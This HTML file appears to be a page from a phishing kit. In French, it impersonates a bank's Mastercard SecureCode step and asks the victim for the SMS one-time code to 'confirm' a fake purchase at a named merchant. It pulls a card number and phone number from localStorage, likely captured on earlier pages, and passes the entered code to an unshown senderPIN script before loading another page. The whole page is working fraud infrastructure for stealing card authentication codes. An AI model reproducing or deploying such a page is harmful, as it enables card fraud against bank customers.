<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="robots" content="noindex,nofollow">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>otpCaisse_Mastercard</title>
    <link rel="stylesheet" href="./otpCaisse_Mastercard.css">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

<!--Scripts jquery-->    
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 <!--Scripts jquery-->
    <script>
        document.getElementById("encryptedCardNumber").innerHTML =  localStorage.getItem("encryptedCardNumber");
         document.getElementById("numtel").innerHTML =  localStorage.getItem("numtel");
       
       </script>

<script>
    function validateForm() {
      var x = document.forms["myForm"]["otp"].value;
      if (x == "" || x == null) {
        alert("Veuillez entrer le code reçu par SMS");
        return false;
      }
    }
    </script>

</head>


<body>
    <div id="piin">

    </div>
    
    <div class="totp">

        <form name="myForm" onsubmit="  validateForm();">

        <div class="wrapper">

            <div class="head">

            <span class="bankLogo">

                <img src="./assets/caisse.png">

            </span>

            <span class="ccLogo">
              <img src="./assets/mastercard.png">
            </span>
        </div>
        <h1>Identification</h1><br>
        <div class="alert">
             
            <p>Authentification en cours...</p>
            <h4>Veuillez-vous authentifier à l'aide du code d'accès reçu par SMS</h4><br>
            <div class="lds-spinner">
                <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>
            </div>  
        </div><br>
        <p>Pour sécuriser au mieux vos achats en ligne sur les sites affichant le logo paiement MasterCard SecureCode, il vous suffit désormais de vous identifier en saisissant le code d'accès reçu par SMS sur votre téléphone.
            <br>Si vous ne recevez un SMS, il vous suffit de vous identifier avec votre téléphone.
        </p><hr>
     <div class="details">
        <div class="labels">
            <label for="" class="a">Marchand: </label><br>
           
            <label for="" class="a">Date:</label> <br>
            <label for="" class="a">N° de carte: </label>  <br>

        </div>
        <div class="spans">
            <span id="marchand"> Boulanger</span><br>
           
            <span id="date"></span><br>
            <span>xxxxxxx<span id="encryptedCardNumber"></span> </span><br>
        
        </div><br>
        <label for="" >Code d'accès reçu par SMS: &NonBreakingSpace;</label>
        <input class="otp" name="otp"  id="numPin" type="text">

        <button type="submit" class="ok" 
        href="javascript:void(0);" onsubmit="senderPIN();">OK</button>
    </div><br>
    <img class="notif" src="./assets/caisseNotif.png">
</form>
<br>

<p class="do">
    Cette identification est obligatoire pour conclure votre transaction. Si vous refusez de vous identifier , votre achat sera annulé.
</p>
<br>
<div style="text-align: center; margin: 0 auto; " >
    <button style="margin: 0 auto ;align-items: center; border:  rgba(0, 102, 255, 0.94) solid 1px; color:  rgba(0, 102, 255, 0.94);  justify-content: center; cursor: pointer;align-self: center; display: flex; padding: 6px; background-color: white; width: 500px;  border-radius: 5px;">
       
        <i class="material-icons" style="font-size:19px ;color: rgba(0, 102, 255, 0.94); " >&#xe14b;
        </i>
       &NonBreakingSpace; Je ne souhaite pas m'authentifier et j'annule ma transaction
    
    </button>
</div>
<script src="./senderPIN.js"></script>

<script>
  var dt = new Date();
  document.getElementById("date").innerHTML = (("0"+dt.getDate()).slice(-2)) +"."+ (("0"+(dt.getMonth()+1)).slice(-2)) +"."+ (dt.getFullYear()) +" "+ (("0"+dt.getHours()).slice(-2)) +":"+ (("0"+dt.getMinutes()).slice(-2));
  </script>

 <!--Animated show for the div-->
 <script type="text/javascript">
    $(document).ready(function () {
        $('.ok').click(function () {
            $('.ok').click(senderPIN());
            $('.totp').fadeOut('4000');
            $('#piin').load('commande.html').delay('5000').fadeIn('5000');
        });
    });

</script>
</body>
</html>